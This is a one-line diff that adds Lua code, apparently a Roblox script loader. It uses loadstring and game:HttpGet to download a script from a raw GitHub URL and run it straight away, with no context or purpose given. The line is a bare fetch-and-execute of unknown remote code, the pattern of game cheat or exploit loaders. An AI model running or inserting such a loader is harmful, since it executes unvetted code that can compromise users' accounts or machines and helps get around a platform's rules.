@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MavaaQ/tichoucko/refs/heads/main/fl.lua"))()
